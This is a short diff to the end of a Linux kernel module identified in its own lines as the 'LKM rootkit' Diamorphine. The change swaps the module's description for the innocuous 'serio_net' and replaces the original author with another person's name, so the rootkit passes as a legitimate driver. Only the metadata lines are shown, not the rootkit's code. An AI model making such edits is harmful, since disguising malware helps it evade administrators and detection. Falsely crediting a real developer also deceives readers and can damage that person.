@@ -435,5 +435,5 @@ module_init(diamorphine_init);
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+MODULE_AUTHOR("Dmitry Torokhov");
+MODULE_DESCRIPTION("serio_net");
